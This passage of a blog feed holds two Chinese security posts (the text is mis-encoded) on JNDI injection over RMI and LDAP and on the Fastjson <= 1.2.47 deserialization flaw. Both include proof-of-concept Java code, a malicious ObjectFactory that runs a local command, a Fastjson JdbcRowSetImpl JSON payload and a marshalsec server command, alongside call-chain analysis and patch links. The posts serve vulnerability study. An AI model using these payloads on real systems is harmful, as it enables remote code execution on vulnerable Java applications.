href="https://blog.51cto.com/liyongyao/1205723" target="_blank" rel="noopener">https://blog.51cto.com/liyongyao/1205723</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-17 16:41:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/sky.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="RMI" scheme="http://patrilic.top/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>JNDIæ³¨å…¥</title>
    <link href="http://patrilic.top/2020/03/15/JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://patrilic.top/2020/03/15/JNDIæ³¨å…¥/</id>
    <published>2020-03-15T08:41:55.000Z</published>
    <updated>2020-03-15T08:46:52.757Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-15 16:41:55</p></blockquote><p><img src="/wallpaper/girl_rain_anime.jpg" alt></p><h2 id="0x00-JNDI"><a href="#0x00-JNDI" class="headerlink" title="0x00 JNDI"></a>0x00 JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>æ˜¯Javaæä¾›çš„Java å‘½åå’Œç›®å½•æ¥å£ã€‚</p><p>JNDIæ˜¯ä¸€ä¸ªAPIï¼Œå…è®¸å®¢æˆ·ç«¯é€šè¿‡nameå‘ç°å’ŒæŸ¥æ‰¾æ•°æ®å’Œå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JndiName</span></span><br><span class="line">String jndiName= ...;</span><br><span class="line"><span class="comment">// Initial</span></span><br><span class="line">Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line"><span class="comment">// lookupè¯¥nameçš„æ•°æ®</span></span><br><span class="line">DataSource ds = (DataSourse)context.lookup(jndiName);</span><br></pre></td></tr></table></figure><h2 id="0x01-JNDI-RMI"><a href="#0x01-JNDI-RMI" class="headerlink" title="0x01 JNDI-RMI"></a>0x01 JNDI-RMI</h2><p>JNDIæ³¨å…¥å°±æ˜¯å¦‚æœæˆ‘ä»¬å¯ä»¥ä»»æ„æ§åˆ¶<code>jndiName</code>çš„å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åŠ è½½JNDIï¼Œè¿œç¨‹æ‰§è¡ŒClass</p><p>RMIçš„å·¥å‚ç±»ï¼š <code>com.sun.jndi.rmi.registry.RegistryContextFactory</code><br>poc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jndipoc;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/Exploit"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Exploit.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨<code>marshalsec</code>èµ·ä¸€ä¸ªrmiServer<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8001/\<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure></p><p>è°ƒç”¨é“¾<br><img src="/JNDIæ³¨å…¥.resources/92E79E2A-D953-4AF0-A601-3E1E9CDE9BF9.png" alt="32b3b6b9a468d18fdcca883f96a4ccb1"></p><p><code>javax/naming/InitialContext.java</code><br><img src="/JNDIæ³¨å…¥.resources/3F51F62A-01B2-45C2-8387-D8D76D25CAA8.png" alt="137ab716e3170cda87bb1a02e86f4699"></p><p><img src="/JNDIæ³¨å…¥.resources/B1DFB787-7E64-4203-BF7D-6ACA2CEFE1A1.png" alt="95081010ce99e4df47e36e42bdd897fa"></p><p><code>com/sun/jndi/toolkit/url/GenericURLContext.class</code><br><img src="/JNDIæ³¨å…¥.resources/4181C1B9-2077-4823-B7F8-E401B35D0E9D.png" alt="607cf22fd764178219e5633d3e59148f"></p><p><code>com/sun/jndi/rmi/registry/RegistryContext.class</code><br><img src="/JNDIæ³¨å…¥.resources/F361357C-1D3E-4502-89DD-C280371B033A.png" alt="d2b4b2f2faf09b2ce06fc10d4539c4f0"></p><p>ä¸registryé€šè®¯ï¼Œè·å–RMIæœåŠ¡çš„IPã€‚</p><p><img src="/JNDIæ³¨å…¥.resources/B42F2E52-85BF-4AA8-8899-24B222662FCB.png" alt="8aa11b1b8c40eec91bdcbbed5a494f92"></p><p><img src="/JNDIæ³¨å…¥.resources/CC81020D-AC99-4A06-B341-7505292F613D.png" alt="42720ae0c9153a7bb3eab271e128d0e8"></p><p>ç›´æ¥è¿›å…¥åˆ°<code>help.loadClass()</code><br><img src="/JNDIæ³¨å…¥.resources/EF974C32-309A-4DDE-885F-4D3E71E1E9AD.png" alt="87bce328ebf0fa13b8037366c4ef1087"></p><h2 id="0x02-JNDI-LDAP"><a href="#0x02-JNDI-LDAP" class="headerlink" title="0x02 JNDI-LDAP"></a>0x02 JNDI-LDAP</h2><p>LDAPå·¥å‚ç±»ï¼š<code>com.sun.jndi.ldap.LdapCtxFactory</code><br>poc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jndipoc;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"ldap://127.0.0.1:1389/Exploit"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/JNDIæ³¨å…¥.resources/B2295304-CC10-4C71-A29F-20C8554F8B60.png" alt="52120be59855a8db14c257f25beb3d23"></p><p>é¦–å…ˆåŒæ ·é€šè¿‡<code>javax/naming/InitialContext.java#lookup</code><br><img src="/JNDIæ³¨å…¥.resources/F71697CE-D541-49CD-ABEC-28EEB4F1FCCE.png" alt="ad07da697b51c5e87ca3d8064b4895ee"></p><p>ldapåœ¨<code>com/sun/jndi/url/ldap/ldapURLContext.class</code>ä¸­è¿›è¡Œå¤„ç†<br><img src="/JNDIæ³¨å…¥.resources/FDE49127-3E24-4369-9C6E-48A8A02E251D.png" alt="1fa1f1b14a630beaeaccfdc99216d0f7"></p><p><code>com/sun/jndi/toolkit/url/GenericURLContext.class</code><br><img src="/JNDIæ³¨å…¥.resources/B4EB7A4C-DC01-48C6-AA82-BDF95279FF57.png" alt="126e64ab851965efa7b676a457fccd7b"></p><p><code>com/sun/jndi/ldap/LdapCtx.class</code><br><img src="/JNDIæ³¨å…¥.resources/4DD9DB27-036B-40B6-9592-F923D6B35B4B.png" alt="72af0a6022ea2a61b0136234c217f32d"></p><p>æœ€åè¦†ç›–ç±»æ‰§è¡Œå‘½ä»¤<br><code>javax/naming/spi/DirectoryManager.jave</code><br><img src="/JNDIæ³¨å…¥.resources/247C763C-A383-4710-8437-10FF0ACE4A4C.png" alt="f7e10059444f062b7247cd023beb22be"></p><h2 id="0x03-ç‰ˆæœ¬é™åˆ¶"><a href="#0x03-ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="0x03 ç‰ˆæœ¬é™åˆ¶"></a>0x03 ç‰ˆæœ¬é™åˆ¶</h2><ul><li>RMIåŠ¨æ€åŠ è½½æ¶æ„ç±» : 7u21ã€6u45</li><li>JNDI - RMI : 6u132ã€7u122ã€8u113</li><li>JNDI - LDAP : 6u211ã€7u201ã€8u191ã€11.0.1</li></ul><h2 id="0x04-ç›¸å…³é“¾æ¥"><a href="#0x04-ç›¸å…³é“¾æ¥" class="headerlink" title="0x04 ç›¸å…³é“¾æ¥"></a>0x04 ç›¸å…³é“¾æ¥</h2><p><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633</a><br><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br><a href="https://javasec.org/javase/JNDI/" target="_blank" rel="noopener">https://javasec.org/javase/JNDI/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-15 16:41:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_rain_anime.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="JNDI" scheme="http://patrilic.top/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <link href="http://patrilic.top/2020/03/14/Fastjson%20=%3C%201.2.47%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://patrilic.top/2020/03/14/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ/</id>
    <published>2020-03-14T15:08:55.000Z</published>
    <updated>2020-03-14T15:13:29.100Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-14 23:08:55</p></blockquote><p><img src="/wallpaper/33703665.png" alt></p><h2 id="0x00-RMIå’ŒLDAPçš„é€‚ç”¨ç‰ˆæœ¬"><a href="#0x00-RMIå’ŒLDAPçš„é€‚ç”¨ç‰ˆæœ¬" class="headerlink" title="0x00 RMIå’ŒLDAPçš„é€‚ç”¨ç‰ˆæœ¬"></a>0x00 RMIå’ŒLDAPçš„é€‚ç”¨ç‰ˆæœ¬</h2><ul><li>RMIçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 6u132, JDK 7u122, JDK 8u113ä¹‹å‰ã€‚</li><li>LDAPçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å‰ã€‚</li></ul><h2 id="0x01-Poc"><a href="#0x01-Poc" class="headerlink" title="0x01 Poc"></a>0x01 Poc</h2><p>Exp.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="comment">//import com.alibaba.fastjson.JSONObject;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.print("Success");</span></span><br><span class="line">        String payload = <span class="string">"&#123;\"name\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"x\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Exploit.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>RMIæœåŠ¡å™¨ç”±<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>å¯åŠ¨<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8001/\<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure></p><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/B680A661-76AE-438F-BB0D-D2C2214F4A67.png" alt="7f359d16876b2eaa97d0064163818915"><br>è¿è¡Œexpçš„æ—¶å€™ï¼Œå‘ç°å¹¶ä¸èƒ½æˆåŠŸæ‰§è¡Œ<br>å› ä¸ºjdkç‰ˆæœ¬ä¸æ”¯æŒï¼Œå½“å‰ç‰ˆæœ¬ä¸º8u191ï¼Œldapå’Œrmiçš„æ–¹å¼éƒ½ä¸è¡Œï¼Œåˆ‡æ¢ç‰ˆæœ¬åˆ°7u80</p><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/E79CF324-93FC-4CE1-BE1B-DFEF90EB9AF7.png" alt="1edd992c19ef12dba70c2e95888c2557"></p><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h2><p>ç¨‹åºæœ€å…ˆè¿›å…¥åˆ°<code>DefaultJSONNParser</code>ï¼Œå°†æ•´ä¸ªpayloadä½œä¸ºå‚æ•°ä¼ å…¥Jsonçš„è§£é‡Šå™¨ï¼Œè¿›å…¥åˆ°<code>DefaultJsonParser.parser()</code>å‡½æ•°<br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/28FE6040-A663-4917-9B33-5FFF2CDB85BC.png" alt="6e56c3da292b27f3113a3ee0abaa98ee"></p><p>ç»è¿‡é€ä½çš„æ•°æ®è¯»å–ï¼Œå°†Jsonçš„Keyåˆ†å‰²å¼€ï¼Œè°ƒç”¨<code>addSymbol()</code>å‡½æ•°åŠ å…¥åˆ°<code>symbolTable</code><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/529DB604-D9A5-4738-B262-866E5A051044.png" alt="82ce67277b809a6566d42776edf55c1a"><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/5C90CF8E-8639-47B0-8A2B-70CCAFB5BD96.png" alt="0b36d6845ac592e5e2a1edd046485417"><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/6D7B5F66-9CF9-4F83-B579-1C5A50AC7EF3.png" alt="d7aaede895bd86db6cd8b3b2bf521090"></p><p>å¦‚æœè·å–åˆ°çš„keyæ˜¯<code>@type</code>ï¼Œå°±é€šè¿‡<code>clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures())</code>æ˜¯å¦æ˜¯é»‘åå•ä¸­çš„ç±»<br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/575BDF20-3477-41EF-86A1-37C4F82D0C0D.png" alt="e54434863810d533e4abbfffd17cf444"></p><p>å› ä¸º<code>@type == &quot;java.lang.class</code>ï¼Œä¸åœ¨é»‘åå•å†…ï¼Œæ‰€ä»¥ä¼šå°†valueå¸¦å…¥åŠ è½½<br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/010E81DB-CC0B-463D-99D5-3AF7B4424D0F.png" alt="c0cec95a77c1fcb09eae7a31f55ad924"></p><p>è·Ÿè¿›deserializer<br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/6768D0AC-556B-4F32-8501-883DC598C4D2.png" alt="cd2a71923e82d11b89acf17a93dac732"></p><p>å¯ä»¥çœ‹åˆ°StrVal = objValï¼Œè€ŒobjValå°±æ˜¯ç­‰äºpocä¸­ç»™å‡ºçš„valå‚æ•°</p><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/901E4F52-7331-40E0-81CD-D0B69505C262.png" alt="b430f5adbde2b365f5488b65dd344da4"><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/41CFF0FE-DC60-4991-8B01-21FF0131FC03.png" alt="c91078c017a755f6a5eafa795011e9b4"></p><p>ç„¶åä¸‹é¢ç»è¿‡ä¸€å †ifåˆ¤æ–­ï¼Œè¿›å…¥åˆ°<br><code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/8283EB70-1319-4470-9568-666FBD873996.png" alt="e609abb525e01030d936b3bbe7add652"><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/AF8AAF33-B7F5-43E7-BE88-156D470E8346.png" alt="a98059fd01221035ecd2841522af4275"></p><p>è·Ÿè¿›<code>loadClass()</code><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/C69E1B97-C258-4C9C-81F5-296B60425223.png" alt="d4728569a9c8cb904ad5b0e1d4b6a6df"></p><p>MiscCode:548è¡Œ<br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/F2E2E046-ADFD-4EEB-92CB-37DCDED33271.png" alt="79065bc4bef1123ed26820efacfbd05d"></p><p>æœ€åè¿›å…¥JdbcRowSetImplé€šè¿‡è°ƒç”¨SetAutoCommit() -&gt; connect()å¯¹dataSourceNameè¿›è¡Œlookupï¼Œå®ç°rmiæ³¨å…¥<br><code>com/alibaba/fastjson/parser/DefaultJSONParser.class</code><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/33674652-BC80-4F07-9490-3141F00F2A62.png" alt="d8ddb20ca9fbd8f657af97ef9c32ed6c"></p><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/AA25BA2D-3AAC-4AF3-8A48-89D90D64DE94.png" alt="b09fa3f3e107fafb1e34e3fb83ba5656"></p><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/0D7B889B-8F73-47A0-A043-B6CCAC90DF55.png" alt="a16b595ff0b2dc967bca9c66a947d82a"></p><h2 id="0x03-æµç¨‹"><a href="#0x03-æµç¨‹" class="headerlink" title="0x03 æµç¨‹"></a>0x03 æµç¨‹</h2><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/C0337364-B681-4CBE-95D1-38D3DD294B50.png" alt="041e5d8c0bb564c73c5b2a608fc6756f"></p><h2 id="0x04-Patch"><a href="#0x04-Patch" class="headerlink" title="0x04 Patch"></a>0x04 Patch</h2><p><a href="https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686#diff-d09347575523cbca09b52606214d95a7" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686#diff-d09347575523cbca09b52606214d95a7</a></p><p><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/E04A36F0-B79B-416F-9AE7-B594B243388C.png" alt="013ef4165b6fced9afd44595f1ed8d44"><br>å°†cacheè®¾ä¸ºäº†false</p><p><a href="https://github.com/alibaba/fastjson/commit/8034935a5405a135e77caa1e2f61b3e78fc02da8" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/8034935a5405a135e77caa1e2f61b3e78fc02da8</a><br><img src="/Fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´åˆ†æ.resources/5CD5FE20-C4B0-4F9E-9744-02AC5B9B52A2.png" alt="ed8072ff15344186d6fe82a1030ddf3a"></p><h2 id="0x05-ç›¸å…³é“¾æ¥"><a href="#0x05-ç›¸å…³é“¾æ¥" class="headerlink" title="0x05 ç›¸å…³é“¾æ¥"></a>0x05 ç›¸å…³é“¾æ¥</h2><p><a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a><br><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br><a href="https://javasec.org/javase/JNDI/" target="_blank" rel="noopener">https://javasec.org/javase/JNDI/</a><br><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a><br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-14 23:08:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/33703665.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="FastJson" scheme="http://patrilic.top/categories/FastJson/"/>
    
    
      <category term="FastJson" scheme="http://patrilic.top/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>DotNetToJScript &amp;&amp; GadgetToJScript</title>
    <link href="http://patrilic.top/2020/03/10/DotNetToJScript%20&amp;&amp;%20GadgetToJScript/"/>
    <id>http://patrilic.top/2020/03/10/DotNetToJScript &amp;&amp; GadgetToJScript/</id>
    <published>2020-03-10T09:48:22.000Z</published>
    <updated>2020-03-10T09:58:38.565Z</updated>
    
